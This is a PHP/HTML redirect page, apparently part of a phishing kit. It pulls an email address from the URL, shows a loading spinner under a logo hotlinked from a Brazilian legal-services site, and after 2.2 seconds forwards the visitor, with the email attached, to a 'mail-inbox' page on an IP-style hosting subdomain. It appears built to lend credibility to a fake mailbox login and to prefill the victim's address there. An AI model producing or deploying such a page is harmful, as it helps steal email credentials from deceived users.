<?php
// Pega a query string completa
$query = isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '';
$email = '';

// Tenta pegar o email da forma padrão ?email=...
if (isset($_GET['email'])) {
    $email = $_GET['email'];
} else {
    // Se não tiver chave, tenta extrair qualquer e-mail da query
    if (preg_match('/[^\s@]+@[^\s@]+\.[^\s@]+/', $query, $matches)) {
        $email = $matches[0];
    }
}

// Função simples para validar e-mail
function validar_email($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL);
}

// URL de redirecionamento base
$redirectUrlBase = "https://218.178.205.92.host.secureserver.net/mail-inbox/index.php";
$redirectUrl = $redirectUrlBase . "?email=" . urlencode($email);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Redirecionando...</title>
<style>
    body {
        margin: 0;
        padding: 0;
        background: #0d1117;
        color: #ffffff;
        font-family: Arial, sans-serif;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
        text-align: center;
    }

    .container {
        max-width: 350px;
    }

    .logo {
        width: 80px;
        height: 80px;
        margin-bottom: 20px;
        border-radius: 50%;
    }

    .spinner {
        border: 4px solid rgba(255, 255, 255, 0.2);
        border-top: 4px solid #ffffff;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 1s linear infinite;
        margin: 20px auto;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    .msg {
        font-size: 1.1rem;
        opacity: 0.9;
    }

    .error {
        color: #ff4d4d;
    }
</style>
<?php if ($email && validar_email($email)) : ?>
<meta http-equiv="refresh" content="2.2;url=<?php echo $redirectUrl; ?>">
<?php endif; ?>
</head>
<body>
<div class="container">
    <img src="https://static.jusbr.com/web/lawsuit/_next/static/media/keep_updated.68ab33cd.svg" 
         class="logo" alt="Logo">

    <div class="spinner"></div>

    <div class="msg">
        <?php
        if (!$email) {
            echo "<span class='error'>Nenhum e-mail encontrado na URL.</span>";
        } elseif (!validar_email($email)) {
            echo "<span class='error'>E-mail inválido:<br>" . htmlspecialchars($email) . "</span>";
        } else {
            echo "Aguarde, estamos processando seu acesso...";
        }
        ?>
    </div>
</div>
</body>
</html>
